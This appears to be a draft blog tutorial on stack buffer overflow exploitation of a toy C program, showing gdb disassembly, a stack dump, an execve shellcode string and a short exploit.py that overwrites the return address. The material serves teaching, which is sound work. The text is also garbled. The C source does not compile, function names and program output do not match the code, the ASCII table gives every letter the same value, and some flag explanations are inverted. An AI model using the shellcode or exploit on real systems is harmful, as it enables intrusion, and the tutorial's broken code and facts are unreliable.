---
title: "Buffer Overflow Exploitatoin"
date: 2020-08-10T20:03:02-03:00
draft: true
---

Buffer overflow is severe vulnerability caused by an unsinitezed input that overwrite an improper memory.

Considering this C code:

```
#include <stdio.h>


void vuln(void) 
{
    char name[10];

    puts("Say my name: ");
    gets(input);
    printf("My name is: %s\n", name);
}

void real_name()
{
    puts("My name truly is: Eduardo")
}


int main(void) {

        vuln();

        return 0;
}
```

Now we need to compile this program, we will use some flags to disable some binary protections:


Brief explain:
- **execstack:** Disable stack instruction execution.
- **fno-stack-protector:** Protect to overwrite of return address.
- **no-pie:** Disable memory randomization.

Made it, we got an executable file name "vulnerable".

This peace of code represente some operations that basically get an input, store the this content and print them. can you see it below.

```
~$ ./vulnerable
Give me some input:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

You say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

But, when this input is bigger than expected we got:

```
~$ ./vulnerable
Give me some input:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

You say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    10850 segmentation fault (core dumped)  ./vulnerable
```

Vuala, we got an unexpected behaviour.


We dont go deeper in assembly or computer architecture, but we need to understand a bit to comprehend and exploit this failure. Bellow i will explain some of necessary contento to this purpose.

#### Stack
    Is a memory segment. witch means that some content is stored in it, but between this content are us program variables. Also this contens is managed by an particular form, it work inserting(push) and removing(pop) elements on it, and following the rule FILO(first in is the last out).

#### Registers

**rip**: The RIP(Instruction pointer) is an register that is responsible for execute the next instruction of code.

 **rsp**: The rsp(Stack pointer) is an memory register that commonly apoint to the top of stack

 **rbp**: The base pointer register define the base of stack frame, it means the space reversed in stack to store variables.

#### Instructions 

**call**: This is a assembly instruction, like a C function when we call them, this instruction goes to especified address/label especified after its declaration. but it's not just that. because the funtion need to return to the old scope when it's called, because that, call, push the address of the next instruction after it self on the stack to get it later and come back to the old scope. 

**ret**: An assembly instruction that get the address on the top of stack and put them to RIP register by it self execute the intruction in this address.


Now come to gdb

```
gdb vulnerable
```
In console type:

```
disassembly vuln
                            [ Disassembly vuln function ]

   0x0000000000401176 <+0>:     endbr64
   0x000000000040117a <+4>:     push   rbp
   0x000000000040117b <+5>:     mov    rbp,rsp
   0x000000000040117e <+8>:     sub    rsp,0x40
   0x0000000000401182 <+12>:    lea    rdi,[rip+0xe7b]
   0x0000000000401189 <+19>:    call   0x401060 <puts@plt>
   0x000000000040118e <+24>:    lea    rax,[rbp-0x40]
   0x0000000000401192 <+28>:    mov    rdi,rax
   0x0000000000401195 <+31>:    mov    eax,0x0
   0x000000000040119a <+36>:    call   0x401080 <gets@plt>
   0x000000000040119f <+41>:    lea    rax,[rbp-0x40]
   0x00000000004011a3 <+45>:    mov    rsi,rax
   0x00000000004011a6 <+48>:    lea    rdi,[rip+0xe6c]
   0x00000000004011ad <+55>:    mov    eax,0x0
   0x00000000004011b2 <+60>:    call   0x401070 <printf@plt>
   0x00000000004011b7 <+65>:    nop
   0x00000000004011b8 <+66>:    leave
   0x00000000004011b9 <+67>:    ret
   ```

With this command, we got the assembly code of program. we can see some function that we was used are present and was called (put, gets, printf) 

```
run
                                [  Run program ]

Give me some input:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
You say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
With this assert the program was executed in gdb context, in this exemple we will reproduce the unexpected behavior as before. but the difference is that now is possible to see the content of stack as can see bellow.
```
x/15gx $rsp
                                  [ Print STACK ]

0x7fffffffd8f8: 0x4141414141414141      0x4141414141414141
0x7fffffffd908: 0x4141414141414141      0x4141414141414141
0x7fffffffd918: 0x4141414141414141      0x0000614141414141
0x7fffffffd928: 0x00000000004011d1      0x00000000004011f0
0x7fffffffd938: 0x5e4a01bb79a2c0a2      0x0000000000401090
0x7fffffffd948: 0x00007fffffffd9f0      0x0000000000000000
0x7fffffffd958: 0x0000000000000000      0xa1b5fe44cb82c0a2
0x7fffffffd968: 0xa1b5ee07f96cc0a2

```

It's the partial dump stack memory. we can see that most of them is filled by "41". This represent the input sended for the program. But, 41 is diferent to "A" right? yes, but computacionaly, letter are represented by numbers, we can check it when we look at ascii table.

```
~$ man ascii
```
|Oct|Dec|Hex|Char|
|---|---|---|----|
|101|65 |41 | A  |
|101|65 |41 | B  |
|101|65 |41 | c  |
|101|65 |41 | D  |
|101|65 |41 | F  |
|101|65 |41 | G  |
|101|65 |41 | H  |

So, we can check that the input is realy stored in memory as an hexadecimal number. 

Considering that, and what we was talking about over some assembly instructions and registers. we got that, the rsp regiter appoint to 0x4141414141414141  that is the same to 0xAAAAAAAA and it means that the top address of memory is not the expected address that is the address that will return to scope of main function. 

Go follow step by stap to understand whats happened.

This illustration below show the stage of stack

```
                                     STACK
                High address:    |0x00000001|  <- rsp
                                 |   ...    |  
                                 | name[50] | <- Array
                                 |   ...    | <- rbp
                                 |0x00000FFC| 
                Low address      |0x00000FFF| 
```




```
                                     STACK
                High address:    |0x44444444|  <- rsp
                                 |0x43434343|  
                                 |0x42424242| <- Array
                                 |0x41414141| <- rbp
                                 |0x00000FFC| 
                Low address      |0x00000FFF| 
```

But it's not the core problem, it's behavior can be give much more damege than only crash the application, if you can overwrite the RIP register you can take control of the execution flow of the program might be possible executing other parts of code or execute arbitrary commands.

if insted you override the return address with "A" our some other junk, you especify an valid return adress, like the function "congratulations" in code above, whast will happen?

```
$HOME/file_path/vulnerable < payload
```
**Output**

```
Give me some input:
You say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@
YOU WIN
[1]    7836 segmentation fault (core dumped)
```

```
shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
```

exploit.py
```
padding = "A" * 72
ret_overwrite = "\xba\x11\x40\x00\x00\x00\x00\x00"
print padding + ret_overwrite
```


